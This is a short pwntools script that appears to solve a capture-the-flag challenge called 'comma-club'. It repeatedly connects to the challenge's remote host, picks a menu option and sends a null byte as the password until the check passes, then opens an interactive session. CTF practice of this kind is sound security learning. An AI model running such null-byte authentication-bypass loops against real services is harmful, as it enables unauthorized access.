from pwn import *

exe = ELF('./challenge')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        continue
    """)
elif args.REMOTE:
    io = remote("addr", 1337)

i = 0
while True:
    print(i)
    i += 1
    # io = process(exe.path)
    io = remote("comma-club.chal.hackthe.vote", 1337)
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'>', b'\x00')
    if b'Incorrect' in io.recvline():
        io.close()
        continue
    io.interactive()
